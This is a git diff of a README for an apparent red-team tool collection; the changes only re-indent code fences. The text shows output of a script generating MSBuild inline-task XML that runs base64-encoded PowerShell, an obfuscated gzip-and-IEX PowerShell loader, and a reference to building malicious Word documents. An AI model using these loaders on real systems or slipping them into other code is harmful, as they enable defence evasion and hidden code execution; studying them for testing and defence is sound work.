@@ -8,7 +8,7 @@
 
     Example output **not minimized**:
     
-    ```
+```
 C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1
 
         :: Powershell via MSBuild inline-task XML payload generation script
@@ -61,11 +61,11 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
   </UsingTask>
 </Project>
 ------------------------------------------------------------------------------------
-    ```
+```
     
     **minimized**
     
-    ```
+```
 C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1 -m                     
                                                                                                                   
         :: Powershell via MSBuild inline-task XML payload generation     script                                       
@@ -89,7 +89,7 @@ kVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace     r=R
 ();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return     true;}}]]></Code></Task></Usi
 ngTask></Project>                                                                                                     
 ------------------------------------------------------------------------------------                              
-    ```
+```
 
 
 - **`msbuild-powershell-msgbox.xml`** - Example of Powershell execution via MSBuild inline task XML file. On a simple Message-Box script.
@@ -101,10 +101,10 @@ ngTask></Project>
 
     Example:
 
-    ```
+```
 $s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
-    ```
+```
 
 
 - **`muti-stage-1.md`** - Multi-Stage Penetration-Testing / Red Teaming Malicious Word document creation process. ([gist](https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb))
